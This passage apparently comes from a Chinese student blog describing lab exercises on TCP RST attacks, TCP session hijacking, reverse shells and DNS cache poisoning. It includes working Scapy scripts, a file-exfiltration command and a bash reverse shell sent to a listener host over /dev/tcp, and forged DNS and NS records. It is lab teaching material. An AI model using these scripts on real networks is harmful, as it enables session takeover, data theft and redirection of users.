id="2-1-3-Task1-3-Enable-the-SYN-Cookie-Countermeasure"><a href="#2-1-3-Task1-3-Enable-the-SYN-Cookie-Countermeasure" class="headerlink" title="2.1.3. Task1.3 Enable the SYN Cookie Countermeasure"></a>2.1.3. Task1.3 Enable the SYN Cookie Countermeasure</h3><p>启用SYN cookies方法，重新运行攻击程序，比较两者的结果。</p><p><strong>实验步骤：</strong></p><p>启用SYN cookies，此机制能够检测syn flood攻击</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sysctl -w net.ipv4.tcp_syncookies=1</span><br></pre></td></tr></table></figure><p>启动攻击程序，同时修改backlog的值，并查看victim的半连接数，</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sysctl -w net.ipv4.tcp_max_syn_backlog=80</span><br></pre></td></tr></table></figure><p>虽然backlog的值为80，但是状态为SYN_RECV的半连接数量仍然是128（系统资源能够处理的最大值，即阈值），</p><blockquote><p>开启syncookie后再次攻击，攻击无效，远程登录能成功。</p><p>查看此时设置的队列值tcp_max_syn_backlog无效，因为连接并没有存在队列中。</p></blockquote><p><strong>分析：</strong></p><p>SYN Cookie的工作原理如下：</p><ol><li>服务器不立即分配资源： 当服务器接收到客户端的 SYN 请求时，不立即分配实际的资源，如套接字、内存和处理线程&#x2F;进程。</li><li>生成 SYN Cookies： 服务器使用一种特殊的算法（通常是哈希函数）生成一个 SYN Cookie，将这个 Cookie 包含在 SYN-ACK 响应中发送给客户端。</li><li>客户端 ACK： 客户端在后续的 ACK 中将 SYN Cookie 返回给服务器。</li><li>验证 SYN Cookie： 服务器在收到客户端的 ACK 时，验证 SYN Cookie 的有效性。如果验证通过，服务器就知道这是一个合法的连接请求。</li><li>分配资源： 验证通过后，服务器根据 SYN 请求中包含的信息分配实际的资源，完成连接的建立。</li></ol><p>通过这种方式，服务器在<u>接收到 SYN 请求时不立即分配资源，而是在后续的验证阶段才进行实际的资源分配</u>。这使得服务器能够更好地应对大量的 SYN 请求。所以，只有当cookie验证通过，victim才会为连接分配资源，传统的SYN Flooding攻击就无法生效了。</p><h2 id="2-2-Task2-TCP-RST-Attacks-on-telnet-Connections"><a href="#2-2-Task2-TCP-RST-Attacks-on-telnet-Connections" class="headerlink" title="2.2. Task2. TCP RST Attacks on telnet Connections"></a>2.2. Task2. TCP RST Attacks on telnet Connections</h2><p>RST报文可以使得已经建立的TCP连接终止，所以可以通过TCP RST攻击的方法恶意终止两个合法用户的TCP连接。</p><p>在本次task中，我们需要发起TCP RST攻击，使得A和B的telnet连接中断。</p><p>（为了简化实验，假设攻击者和受害者在同一LAN下，可以监控A和B的所有TCP消息。）</p><p><strong>实验步骤：</strong></p><p>使用Scapy库编写可以自动发送TCP RST的py代码，</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">spoof_tcp</span>(<span class="params">pkt</span>):</span><br><span class="line">    IPLayer  = IP(dst=<span class="string">&quot;10.9.0.5&quot;</span>, src=pkt[IP].dst)</span><br><span class="line">    TCPLayer = TCP(flags=<span class="string">&quot;R&quot;</span>, seq=pkt[TCP].ack,</span><br><span class="line">                    dport=pkt[TCP].sport, sport=pkt[TCP].dport)</span><br><span class="line">    spoofpkt = IPLayer/TCPLayer</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;A RST has been sent !&quot;</span>)</span><br><span class="line">    send(spoofpkt, verbose=<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">pkt=sniff(iface=<span class="string">&#x27;br-12c77ce8b78a&#x27;</span>,<span class="built_in">filter</span>=<span class="string">&#x27;tcp and src host 10.9.0.5&#x27;</span>, prn=spoof_tcp)</span><br></pre></td></tr></table></figure><p>实现了<code>sniffing-and-then-spoofing</code>的功能，监听与victim（ip&#x3D;10.9.0.5）发出的TCP数据包，如果存在，就发送虚假的目的地址为victim的RST数据包，关闭TCP连接。</p><p>无法连接成功，因为sniffing-and-then-spoofing程序监听到tcp消息之后，将连接终止了，</p><p>现在在victim container中尝试<code>curl www.baidu.com</code>也无法成功返回数据了，提示连接被reset了。</p><p><strong>分析：</strong></p><p>在监听到TCP数据包的时候，伪造其中一方向另一方发送RST报文即可实现效果。</p><p>但是在实验中发现一个现象，在victim中多次执行<code>curl www.baidu.com</code>，有时候会提示connection被reset了，但有时候会正常返回网页的内容。可见，在curl成功的时候，伪造的RST数据包接收得比较晚，这使得victim在关闭TCP连接前收到了http消息；如果伪造的RST数据包发送的速度足够快，那么curl成功的概率就会降低，</p><h2 id="2-3-Task3-TCP-Session-Hijacking"><a href="#2-3-Task3-TCP-Session-Hijacking" class="headerlink" title="2.3. Task3. TCP Session Hijacking"></a>2.3. Task3. TCP Session Hijacking</h2><p>TCP会话劫持是一种攻击，攻击者利用网络上两个通信主机之间已建立的TCP连接，未经授权地接管这个连接。攻击者能够查看、修改或者发送伪造的数据，仿佛是其中一个通信方。</p><p>如果被劫持的是telnet会话，攻击者可以通过向会话中注入恶意内容使得受害者执行恶意指令。</p><p>在本次的task中，我们需要劫持两个主机之间的telnet会话，使得telnet服务端执行恶意指令。</p><p>（为了简化本次任务，假设攻击者和受害者在同一LAN下，使得攻击者可以监控受害者的所有流量。）</p><p><strong>实验步骤：</strong></p><p>编写session.py文件，插入恶意的命令，查看telnet服务端的secret.txt文件内容，并将内容发送至10.9.0.1主机，部分内容未填入，</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">ip=IP(src=<span class="string">&#x27;&#x27;</span>,dst=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">tcp=TCP(sport=,dport=<span class="number">23</span>,flags=<span class="string">&#x27;A&#x27;</span>,seq=,ack=)</span><br><span class="line">data=<span class="string">&quot;\r cat /secret.txt &gt; /dev/tcp/10.9.0.1/12345\r&quot;</span></span><br><span class="line">pkt=ip/tcp/data</span><br><span class="line">ls(pkt)</span><br><span class="line">send(pkt, verbose = <span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>模拟两个受害者进行telnet通信的过程，多次刷新wireshark抓包界面，抓取**<u>最新</u>**的telnet命令的的数据包，</p><p>配置源端口号、序列号和确认号，接下来根据抓取到的数据包构造session数据包，</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">ip=IP(src=<span class="string">&#x27;10.9.0.6&#x27;</span>,dst=<span class="string">&#x27;10.9.0.5&#x27;</span>)</span><br><span class="line">tcp=TCP(sport=<span class="number">56646</span>,dport=<span class="number">23</span>,flags=<span class="string">&#x27;A&#x27;</span>,seq=<span class="number">3364773977</span>,ack=<span class="number">4002170098</span>)</span><br><span class="line">data=<span class="string">&quot;\r cat /secret.txt &gt; /dev/tcp/10.9.0.1/12345\r&quot;</span></span><br><span class="line">pkt=ip/tcp/data</span><br><span class="line">ls(pkt)</span><br><span class="line">send(pkt, verbose = <span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>在telnet服务端（10.9.0.5的docker容器内）创建secret.txt文件，</p><p>运行python程序前在10.9.0.1主机的12345端口开启监听，</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc -lnvp 12345</span><br></pre></td></tr></table></figure><p>运行session.py程序，</p><p>如下图，可以在wireshark中看到session数据包发送出去后，服务端向10.9.0.1主机的12345端口发送了secret.txt文件的内容；也可以在监听界面看到，结果如下，成功实现攻击。</p><p><strong>分析：</strong></p><p>攻击者要实现TCP会话劫持，有以下两个必要条件：</p><ul><li><p>能够嗅探到网络中的数据包。</p><p>因为要通过嗅探获得正确的（下一次的）数据包的IP地址端口号，和伪造数据包必须需要的seq和ack的值。</p></li><li><p>通信双方未使用加密机制。</p></li></ul><p>本次实验能够成功，主要是通信双方采用的是telnet进行通信，这是一个明文传输的协议，所以攻击者可以随意将TCP数据包中payload的值修改为恶意的值。如果通信双方采用ssh进行通信，那么攻击者很难执行恶意指令，但是仍可以执行TCP RST攻击，但是后果较前者小得多。</p><p>本次task的原理就是，监听A与B的TCP连接（长连接），根据A与B的TCP数据包中的信息（IP，Port，seq，ack）生成伪造的恶意的数据包，使得此数据包像是A与B中的某一方发出的，可以被另一方认可并接受。</p><p>**附：**使用Scapy的sniff函数，实现一个自动嗅探并且发动TCP会话劫持攻击的程序。</p><p>代码如下，</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">spoof_tcp</span>(<span class="params">pkt</span>):</span><br><span class="line">    IPlayer = IP(dst=pkt[IP].dst, src=pkt[IP].src)</span><br><span class="line">    TCPlayer = TCP(flags=<span class="string">&quot;A&quot;</span>, seq=pkt[TCP].seq+<span class="number">1</span>, ack=pkt[TCP].ack+<span class="number">1</span>,</span><br><span class="line">                   dport=pkt[TCP].dport, sport=pkt[TCP].sport)</span><br><span class="line">    Data = <span class="string">&quot;\r echo &#x27;hello wzh 2022141470093~&#x27; &gt; /dev/tcp/10.9.0.1/12345\r&quot;</span></span><br><span class="line">    spoofpkt = IPlayer/TCPlayer/Data</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;A hijack packet has been sent !&quot;</span>)</span><br><span class="line">    send(spoofpkt, verbose=<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">pkt=sniff(iface=<span class="string">&#x27;br-12c77ce8b78a&#x27;</span>,<span class="built_in">filter</span>=<span class="string">&#x27;tcp and dst port 23&#x27;</span>, prn=spoof_tcp)</span><br></pre></td></tr></table></figure><p><strong>效果：</strong></p><p>监听处也受到了hello的消息</p><p><strong>注意</strong>：</p><p>值得注意的是，telnet默认选择将输入一个字节一个字节地传输，所以开启嗅探程序后，输入第一个字母l之后（想要输入的命令是<code>ls</code>），客户端就会发送一个tcp包，嗅探程序捕捉到这个包后就会紧接着发送spoofing数据包，所以此时客户端会由于seq失序而卡住（TCP通信原理）</p><h2 id="2-4-Task4-Creating-Reverse-Shell-using-TCP-Session-Hijacking"><a href="#2-4-Task4-Creating-Reverse-Shell-using-TCP-Session-Hijacking" class="headerlink" title="2.4. Task4. Creating Reverse Shell using TCP Session Hijacking"></a>2.4. Task4. Creating Reverse Shell using TCP Session Hijacking</h2><p>当攻击者可以通过TCP会话劫持注入恶意指令的时候，他们通常都不满足于仅仅执行一个指令，通常，攻击者会通过设置一个后门来实现持续控制受害者机器。</p><p>一个设置后门的常见的方法就是在受害者机器上设置一个反向shell。本次task的目的就是通过TCP会话劫持，在受害者机器上创建一个反向shell。</p><p><strong>实验步骤：</strong></p><p>将auto_hijack.py中注入代码改为创建反向shell的代码，</p><p>大概过程与Task3类似，只是将传递的一条命令内容改为reverse shell，</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/bin/bash -i &gt; /dev/tcp/10.9.0.1/12345 0&lt;&amp;1 2&gt;&amp;1\n\0</span><br></pre></td></tr></table></figure><p>使用user1 container(10.9.0.6)向victim container(10.9.0.5)发送telnet数据包，</p><p>根据wireshark里捕获到的最后一个telnet包填充内容，代码如下，</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">ip=IP(src=<span class="string">&#x27;10.9.0.6&#x27;</span>,dst=<span class="string">&#x27;10.9.0.5&#x27;</span>)</span><br><span class="line">tcp=TCP(sport=<span class="number">56728</span>,dport=<span class="number">23</span>,flags=<span class="string">&#x27;A&#x27;</span>,seq=<span class="number">883258612</span>,ack=<span class="number">2433302307</span>)</span><br><span class="line">data=<span class="string">&#x27;/bin/bash -i &gt; /dev/tcp/10.9.0.1/12345 0&lt;&amp;1 2&gt;&amp;1\n\0&#x27;</span></span><br><span class="line">pkt=ip/tcp/data</span><br><span class="line">ls(pkt)</span><br><span class="line">send(pkt, verbose = <span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>查看监听端口，发现已经连接到反向shell了，使用命令<code>ifconfig</code>查看IP为10.9.0.5，</p><p><strong>分析：</strong></p><p>原理同TCP会话劫持，只是将注入的命令改为创建反向shell的命令。</p><p>创建反向shell的命令，<code>/bin/bash -i &gt; /dev/tcp/10.9.0.1/12345 0&lt;&amp;1 2&gt;&amp;1\n\0</code></p><ul><li><strong>-i</strong> 表示interacitve，可互动的shell。（必须提供一个shell窗口）</li><li>文件描述符0、1、2分别代表标准输入、标准输出、标准错误。</li><li>**&lt;** 表示重定向输出，例如，command &gt; file.txt 将命令 command 的输出写入到 file.txt 文件中。</li><li><strong>&lt;</strong> 表示重定向输入。例如，command &lt; file.txt 将文件 file.txt 的内容作为 command 命令的输入。</li><li><strong>&amp;</strong> 在这里的含义是表示文件描述符。</li></ul><p>对于<code>/bin/bash -i &gt; /dev/tcp/10.9.0.1/12345 0&lt;&amp;1 2&gt;&amp;1</code>这样的命令，<code>/bin/bash -i </code>是要执行的命令，<code>&gt; /dev/tcp/10.9.0.1/12345</code> 是将命令的标准输出重定向到指定的 TCP 连接。</p><h1 id="Lab11-DNS欺骗实验"><a href="#Lab11-DNS欺骗实验" class="headerlink" title="Lab11-DNS欺骗实验"></a>Lab11-DNS欺骗实验</h1><h3 id="The-Attack-Tasks"><a href="#The-Attack-Tasks" class="headerlink" title="The Attack Tasks"></a><strong>The Attack Tasks</strong></h3><p>DNS攻击的主要目标就是使得用户尝试使用A域名登录A网站的时候，被定位到B网站。例如，当用户访问网上银行时，如果攻击者能够将用户重定向到一个看起来很像银行主网站的恶意网站，用户可能会受骗，并泄露其网上银行账户的密码。</p><h4 id="Task1-Directly-Spoofing-Response-to-User"><a href="#Task1-Directly-Spoofing-Response-to-User" class="headerlink" title="Task1. Directly Spoofing Response to User"></a>Task1. Directly Spoofing Response to User</h4><p>当一个用户在浏览器中输入某个网站的域名时，用户的电脑会先向本地的DNS服务器查询该域名的IP地址。这时，如果攻击者可以嗅探到DNS request消息，攻击者可以立即伪造并发回一个虚假的DNS response，<strong><u><em>如果这个虚假的response比真正的更快到达用户的电脑</em></u></strong>，那么这个虚假的response就会被用户的电脑所接受。如下图。</p><img src="https://raw.githubusercontent.com/Hozenghan/blogsResources/master/images/截屏2025-01-05 20.38.32.png" alt="截屏2025-01-05 20.38.32" style="zoom:33%;" /><p>本次task的目标就是模拟攻击者发起这样的攻击；</p><p>当攻击程序运行时，可以在用户电脑上代表用户运行dig命令。此命会使得用户机器向本地DNS服务器发送DNS request，本地DNS服务器最终将向example.com域的权威名称服务器发送DNS request（如果cache中不包含该域的IP）。如果攻击成功，应该能够在回复中看到伪造的信息。比较攻击前后获得的结果。</p><p><strong>实验步骤：</strong></p><p>首先，清除local-dns-server上的缓存：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rndc dumpdb -cache</span><br><span class="line"><span class="built_in">cat</span> /var/cache/bind/dump.db</span><br><span class="line">// <span class="built_in">cat</span> /var/cache/bind/dump.db | grep attacker</span><br><span class="line">// <span class="built_in">cat</span> /var/cache/bind/dump.db | grep example</span><br><span class="line"></span><br><span class="line">rndc flush</span><br></pre></td></tr></table></figure><p>修改代码，然后以管理员权限运行，</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">spoof_user</span>(<span class="params">pkt</span>):</span><br><span class="line"><span class="keyword">if</span> (DNS <span class="keyword">in</span> pkt <span class="keyword">and</span> <span class="string">&#x27;example.net&#x27;</span> <span class="keyword">in</span> pkt[DNS].qd.qname.decode(<span class="string">&#x27;utf-8&#x27;</span>)):<span class="comment"># 判断是否为查询example.com的DNS请求</span></span><br><span class="line">ip  = IP  (dst = pkt[IP].src, src = pkt[IP].dst)</span><br><span class="line">udp = UDP (dport = pkt[UDP].sport, sport = <span class="number">53</span>)</span><br><span class="line"><span class="comment"># 构造ANSWER SECTION</span></span><br><span class="line">Anssec = DNSRR( rrname = pkt[DNS].qd.qname, </span><br><span class="line">                <span class="built_in">type</span>   = <span class="string">&#x27;A&#x27;</span>, </span><br><span class="line">                rdata  = <span class="string">&#x27;1.2.3.1&#x27;</span>,</span><br><span class="line">                ttl    = <span class="number">111</span>)</span><br><span class="line"></span><br><span class="line">dns = DNS( <span class="built_in">id</span> = pkt[DNS].<span class="built_in">id</span>, aa=<span class="number">1</span>, rd=<span class="number">0</span>, qr=<span class="number">1</span>,           </span><br><span class="line">           qdcount=<span class="number">1</span>, qd = pkt[DNS].qd,                 </span><br><span class="line">           ancount=<span class="number">1</span>, an = Anssec)</span><br><span class="line"></span><br><span class="line">spoofpkt = ip/udp/dns</span><br><span class="line">send(spoofpkt)</span><br><span class="line"></span><br><span class="line">f = <span class="string">&#x27;udp and (dst host 10.9.0.53 and dst port 53)&#x27;</span></span><br><span class="line">pkt=sniff(iface=<span class="string">&#x27;br-12c77ce8b78a&#x27;</span>, <span class="built_in">filter</span>=f, prn=spoof_user)</span><br></pre></td></tr></table></figure><p>同时在user container中使用dig命令发送DNS request，</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dig www.example.net</span><br></pre></td></tr></table></figure><p>发现返回的DNS response是py代码中伪造的数据包。</p><p>将嗅探程序关闭并且在本地DNS服务器清楚缓存之后，再次执行dig指令：发现就可以得到正确的IP地址，并且query time为2952毫秒。通常，如果结果来自本地缓存，响应时间会非常短。</p><p><strong>潜在问题补充</strong></p><p>若实际实验中成功没有问题。实验手册中补充，可能会存在正常请求的响应比欺骗包回的快，提出解决方案：使用tc命令延迟向外的流量</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">// Delay the network traffic by 100ms etho对应向外的路由器的网卡，即本实验中对应10.8.0.0/24的网卡</span><br><span class="line">tc qdisc add dev br-862fe9388ef4 root netem delay 100ms</span><br><span class="line">// Delete the tc entry</span><br><span class="line">tc qdisc del dev br-862fe9388ef4 root netem</span><br><span class="line">// Show all the tc entries</span><br><span class="line">tc qdisc show dev br-862fe9388ef4</span><br></pre></td></tr></table></figure><h4 id="Task2-DNS-Cache-Poisoning-Attack-Spoofing-Answers"><a href="#Task2-DNS-Cache-Poisoning-Attack-Spoofing-Answers" class="headerlink" title="Task2. DNS Cache Poisoning Attack - Spoofing Answers"></a>Task2. DNS Cache Poisoning Attack - Spoofing Answers</h4><p>在上次的task中，攻击是针对用户的电脑的。</p><p>为了达到持续攻击的效果，每一次用户的电脑发送对*<a href="http://www.example.com/">www.example.com</a><em>域名的DNS query，攻击者的程序就必须发送一个伪造的DNS response。这并不是那么有效率，**<u><em>一个更好的办法是将攻击目标从用户的电脑转移到DNS服务器。</em></u>*</em></p><p>当本地的DNS服务器接收到DNS query时，它会先从缓存中查看是否有answer。如果有，那么DNS会直接将缓存中的answer发送；如果没有，本地DNS服务器就会尝试向其他DNS服务器询问，当本地DNS服务器得到了answer时，它会先将answer存入本地的缓存，以便下一次直接从缓存中取出。</p><p>因此，如果攻击者可以伪造从其他DNS服务器返回的response，那么本地DNS服务器就会将这个伪造的response存入本地缓存（for certain period of time）。下一次，当用户向本地DNS服务器发送DNS query时，本地DNS服务器会直接从缓存中取出伪造的response发回给用户。通过这样的方法，攻击者只需要通过伪造一次数据包，攻击的影响会一直持续到缓存过期。这种攻击就叫做DNS cache poinoning。</p><p><strong>实验步骤：</strong></p><p>在DNS container中运行rndc flush命令清除缓存。然后运行嗅探程序，同时使得本地DNS服务器向下一个DNS服务器发送query，时延为591msec，</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">spoof_dns</span>(<span class="params">pkt</span>):</span><br><span class="line"><span class="keyword">if</span> (DNS <span class="keyword">in</span> pkt <span class="keyword">and</span> <span class="string">&#x27;example.net&#x27;</span> <span class="keyword">in</span> pkt[DNS].qd.qname.decode(<span class="string">&#x27;utf-8&#x27;</span>)):<span class="comment"># 判断是否为查询example.com的DNS请求</span></span><br><span class="line">ip  = IP  (dst = pkt[IP].src, src = pkt[IP].dst)</span><br><span class="line">udp = UDP (dport = pkt[UDP].sport, sport = <span class="number">53</span>)</span><br><span class="line"><span class="comment"># 构造ANSWER SECTION</span></span><br><span class="line">Anssec = DNSRR( rrname = pkt[DNS].qd.qname, </span><br><span class="line">                <span class="built_in">type</span>   = <span class="string">&#x27;A&#x27;</span>, </span><br><span class="line">                rdata  = <span class="string">&#x27;1.2.3.2&#x27;</span>,</span><br><span class="line">                ttl    = <span class="number">259200</span>)</span><br><span class="line"></span><br><span class="line">dns = DNS( <span class="built_in">id</span> = pkt[DNS].<span class="built_in">id</span>, aa=<span class="number">1</span>, rd=<span class="number">0</span>, qr=<span class="number">1</span>,           </span><br><span class="line">           qdcount=<span class="number">1</span>, qd = pkt[DNS].qd,                 </span><br><span class="line">           ancount=<span class="number">1</span>, an = Anssec)</span><br><span class="line"></span><br><span class="line">spoofpkt = ip/udp/dns</span><br><span class="line">send(spoofpkt)</span><br><span class="line"></span><br><span class="line">f = <span class="string">&#x27;udp and (src host 10.9.0.53 and dst port 53)&#x27;</span></span><br><span class="line">pkt=sniff(iface=<span class="string">&#x27;br-12c77ce8b78a&#x27;</span>, <span class="built_in">filter</span>=f, prn=spoof_dns)</span><br></pre></td></tr></table></figure><p>停止spoof_ns.py攻击代码，user再次发起请求，结果还是1.2.3.2，且<u><strong>时延极小（为0msec）</strong></u>，说明local-dns-server的缓存区已经被污染；此时使用user container发送DNS query，发现得到将一直是虚假的地址。</p><p>将缓存保存到文件<code>rndc dumpdb -cache</code>，查看文件<code>cat /var/cache/bind/dump.db</code>可以看到该域名对应的虚假IP 1.2.3.2已经被存储到缓存文件了。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rndc dumpdb -cache</span><br><span class="line"><span class="built_in">cat</span> /var/cache/bind/dump.db</span><br></pre></td></tr></table></figure><h4 id="Task3-Spoofing-NS-Records"><a href="#Task3-Spoofing-NS-Records" class="headerlink" title="Task3. Spoofing NS Records"></a>Task3. Spoofing NS Records</h4><p>在上一个task中，我们的攻击只影响了一个hostname:<code>www.example.net</code>如果用户们想要得到这个域名下的其他IP地址，比如<code>mail.example.com</code>，我们就需要再次发起攻击。如果，只需要发起一次攻击就可以影响整个<code>example.com</code>域，那么效率就会高很多。</p><p>实现这个目的需要用到DNS reply中的**<u><em>Authority section</em></u>**。当我们伪造一个DNS reply的时候，除了伪造Answer section的answer部分，还可以向Authority section加入内容。当这一项被储存在本地的DNS服务器上时，ns.attacker32.com将作用将来查询example.com域中任何hostname的nameserver。如果ns.attacker32.com是一个被攻击者所掌控的服务器，那么它就可以发送任意的DNS reply以欺骗用户。</p><p>本次task的目标是在的嗅探程序中添加一个伪造的NS record，然后发起攻击。</p><p>在进行攻击之前，请记住首先清除本地DNS服务器上的缓存。</p><p>如果攻击成功，当user container对example.com域中的任何主机名运行dig命令时，将获得ns.attacker32.com提供的假IP地址。还请检查本地DNS服务器上的缓存，看看伪造的ns记录是否在缓存中。</p><p><strong>实验步骤：</strong></p><p>修改代码，修改Authority Section部分，当DNS服务器向上层发起请求时，进行伪装应答，同时返回虚假的权威服务器ns.attacker32.com，</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">spoof_dns</span>(<span class="params">pkt</span>):</span><br><span class="line"><span class="keyword">if</span> (DNS <span class="keyword">in</span> pkt <span class="keyword">and</span> <span class="string">&#x27;example.com&#x27;</span> <span class="keyword">in</span> pkt[DNS].qd.qname.decode(<span class="string">&#x27;utf-8&#x27;</span>)):<span class="comment"># 判断是否为查询example.com的DNS请求</span></span><br><span class="line">ip  = IP  (dst = pkt[IP].src, src = pkt[IP].dst)</span><br><span class="line">udp = UDP (dport = pkt[UDP].sport, sport = <span class="number">53</span>)</span><br><span class="line"><span class="comment"># 构造ANSWER SECTION</span></span><br><span class="line">Anssec = DNSRR( rrname = pkt[DNS].qd.qname, </span><br><span class="line">                <span class="built_in">type</span>   = <span class="string">&#x27;A&#x27;</span>, </span><br><span class="line">                rdata  = <span class="string">&#x27;1.2.3.3&#x27;</span>,</span><br><span class="line">                ttl    = <span class="number">259200</span>)</span><br><span class="line"><span class="comment"># 构造nameserver服务器相关信息</span></span><br><span class="line">NSsec  = DNSRR( rrname = <span class="string">&#x27;example.com&#x27;</span>, </span><br><span class="line">                <span class="built_in">type</span>   = <span class="string">&#x27;NS&#x27;</span>,</span><br><span class="line">                rdata  = <span class="string">&#x27;ns.attacker32.com&#x27;</span>,</span><br><span class="line">                ttl    = <span class="number">259200</span>)</span><br><span class="line"></span><br><span class="line">dns = DNS( <span class="built_in">id</span> = pkt[DNS].<span class="built_in">id</span>, aa=<span class="number">1</span>, rd=<span class="number">0</span>, qr=<span class="number">1</span>,           </span><br><span class="line">           qdcount=<span class="number">1</span>, qd = pkt[DNS].qd,                 </span><br><span class="line">           ancount=<span class="number">1</span>, an = Anssec, </span><br><span class="line">           nscount=<span class="number">1</span>, ns = NSsec)</span><br><span class="line"></span><br><span class="line">spoofpkt = ip/udp/dns</span><br><span class="line">send(spoofpkt)</span><br><span class="line"></span><br><span class="line">f = <span class="string">&#x27;udp and (src host 10.9.0.53 and dst port 53)&#x27;</span></span><br><span class="line">pkt=sniff(iface=<span class="string">&#x27;br-12c77ce8b78a&#x27;</span>, <span class="built_in">filter</span>=f, prn=spoof_dns)</span><br></pre></td></tr></table></figure><p>使用管理员权限运行py程序，同时在user container中使用dig命令发送DNS query，返回的ANSWER SECTION与构造的Anssec无关，而是ns.attacker32.com攻击dns服务器上的结果<code>1.2.3.5</code>，而非构造的Anssec里的ip地址<code>1.2.3.3</code>，然后查看本地DNS服务器的缓存，</p><img src="https://raw.githubusercontent.com/Hozenghan/blogsResources/master/images/截屏2025-01-05 21.27.18.png" alt="截屏2025-01-05 21.27.18" style="zoom:33%;" /><img src="https://raw.githubusercontent.com/Hozenghan/blogsResources/master/images/截屏2025-01-05 20.59.38.png" alt="截屏2025-01-05 20.59.38" style="zoom:33%;" /><p>此时，关闭嗅探程序，在user container中执行<code>dig mail.example.com</code>，那么用户会将此query发送至本地DNS服务器，本地DNS服务器发现这是example.com域下的hostname，并且缓存中有对应的NS(Name Server，用于指定域名的权威DNS服务器)类型的记录，所以本地DNS服务器会将此query转发给ns.attacker32.com，也就是攻击者控制的nameserver，返回的数据也由攻击者的nameserver给出，且请求时间为0msec，</p><p>返回的answer表明IP地址为<code>1.2.3.6</code>，这是由ns.attacker32.com服务器配置文件定义的，</p><p>配置文件如下所示，</p><ul><li><code>@ IN A 1.2.3.4</code>: 将当前域名解析为 IPv4 地址 <code>1.2.3.4</code><br>定义 <code>example.com</code> 的 A 记录，解析到 IPv4 地址 <code>1.2.3.4</code></li><li><code>www IN A 1.2.3.5</code>: 将<code>www.example.com</code>解析为 IPv4 地址<code> 1.2.3.5</code>。</li><li><code>ns IN A 10.9.0.153</code>: 将 <code>ns.example.com</code> 解析为 IPv4 地址 <code>10.9.0.153</code>。</li><li><code>* IN A 1.2.3.6:</code> 将所有其他未指定的主机名解析为 IPv4 地址 1.2.3.6。* 通常代表通配符，表示匹配所有其他未明确列出的主机名。</li></ul><h4 id="Task4-Spoofing-NS-Records-For-Another-Domain"><a href="#Task4-Spoofing-NS-Records-For-Another-Domain" class="headerlink" title="Task4. Spoofing NS Records For Another Domain"></a>Task4. Spoofing NS Records For Another Domain</h4><p>在task3中的DNS cache poisoning攻击使得ns.attacker32.com成为了example.com域的nameserver。受这次攻击成功的灵感，我们尝试将攻击影响扩大到其他域。也就是说，在上次task的伪造的数据包中的Authority部分添加其他的内容，使得ns.attacker32.com也被作用为google.com的nameserver.</p><p><strong>实验步骤：</strong></p><p>先清除本地DNS服务器的缓存，</p><p>修改代码，修改Authority Section部分,使得ns.attacker32.com也被作用为google.com的nameserver.（也要修改DNS数据段的nscount为2），</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">spoof_dns</span>(<span class="params">pkt</span>):</span><br><span class="line"><span class="keyword">if</span> (DNS <span class="keyword">in</span> pkt <span class="keyword">and</span> <span class="string">&#x27;example.com&#x27;</span> <span class="keyword">in</span> pkt[DNS].qd.qname.decode(<span class="string">&#x27;utf-8&#x27;</span>)):<span class="comment"># 判断是否为查询example.com的DNS请求</span></span><br><span class="line">ip  = IP  (dst = pkt[IP].src, src = 